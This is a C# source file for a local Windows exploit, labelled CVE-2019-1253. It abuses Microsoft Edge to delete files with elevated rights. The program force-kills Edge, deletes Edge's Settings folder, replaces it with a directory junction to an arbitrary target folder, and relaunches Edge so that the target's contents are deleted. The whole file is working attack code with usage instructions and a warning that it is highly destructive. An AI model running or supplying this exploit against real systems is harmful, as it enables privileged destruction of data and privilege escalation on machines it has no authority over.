using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PrivilegedFileDelete
{
    class Program
    {
        static void symlink(string folderPath, string targetpath)
        {
            Console.WriteLine("[!] Creating Directory Junction with target: " + targetpath);
            System.Diagnostics.Process process2 = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo1 = new System.Diagnostics.ProcessStartInfo();
            startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo1.FileName = "cmd.exe";
            startInfo1.Arguments = "/C mklink /J \"" + folderPath + "\" \"" + targetpath + "\"";
            process2.StartInfo = startInfo1;
            process2.Start();
        }
        static void killEdge()
        {
            Console.WriteLine("[!] Killing Microsoft Edge [!]");
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C taskkill /F /IM MicrosoftEdge.exe";
            process.StartInfo = startInfo;
            process.Start();


        }
        static void Main(string[] args)
        {
            Console.WriteLine("# Privileged File/Folder Delete Privilege Escalation");
            Console.WriteLine("# CVE-2019-1253");
            Console.WriteLine("# Exploit Author: Nabeel Ahmed (@rogue_kdc)");
            Console.WriteLine("# Tested on: Microsoft Windows 10 x32 & x64");
            Console.WriteLine("# Category: Local");

            if (args.Length > 0 & args.Length < 2)
            {
                var pathWithEnv = @"%USERPROFILE%\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\Settings";
                var folderPath = Environment.ExpandEnvironmentVariables(pathWithEnv);
                string targetpath = args[0];
                if (Directory.Exists(targetpath))
                { 
                    while (true)
                    {
                        Process[] pname = Process.GetProcessesByName("MicrosoftEdge");
                        if (!(pname.Length == 0))
                        {
                            killEdge();
                        }
                        else
                        {
                            Console.WriteLine("[!] Microsoft Edge isn't running or it's killed [!]");
                            break;
                        }
                        
                    }
                    while (true)
                    {
                        try
                        {
                            Directory.Delete(folderPath, true);
                            if (Directory.Exists(folderPath))
                            {
                                Console.WriteLine("[!] Folder %s exists [!]", folderPath);
                                Console.WriteLine("[!] Trying to delete Folder %s [!]", folderPath);

                            }
                            else
                            {
                                Console.WriteLine("[!] Folder doesn't exist.");
                                Console.WriteLine("[!] Attempting to create Directory Junction");
                                symlink(folderPath, targetpath);
                                break;
                            }
                        }
                        catch
                        {
                            Console.WriteLine("[!] Folder doesn't exist.");
                            Console.WriteLine("[!] Attempting to create Directory Junction");
                            symlink(folderPath, targetpath);
                            break;
                        }

                    }

                    Console.WriteLine("[!] Triggering vulnerability ... [!] ");
                    System.Diagnostics.Process process2 = new System.Diagnostics.Process();
                    System.Diagnostics.ProcessStartInfo startInfo1 = new System.Diagnostics.ProcessStartInfo();
                    startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    startInfo1.FileName = "cmd.exe";
                    startInfo1.Arguments = "/C start microsoft-edge:";
                    process2.StartInfo = startInfo1;
                    process2.Start();
                    Console.WriteLine("[!] Triggering vulnerability ... [!] ");
                    Console.WriteLine("[!] Files are now being deleted [!] ");
                }
                else
                {
                    Console.WriteLine("[!] Target folder doesn't exist [!] ");
                }
            }
            else
            {
                Console.WriteLine("-------------------------------------------------");
                Console.WriteLine("[+] Usage: exploit.exe <path to folder>");
                Console.WriteLine("-------------------------------------------------");
                Console.WriteLine("[!] This exploit can be very destructive [!] ");
                Console.WriteLine("[!] Use with caution [!] ");
                Console.WriteLine("-------------------------------------------------");
                if (args.Length >= 2)
                {
                    Console.WriteLine("[!] Looks like you forgot to put quotes around your path!!");
                }

            }

        }
    }
}
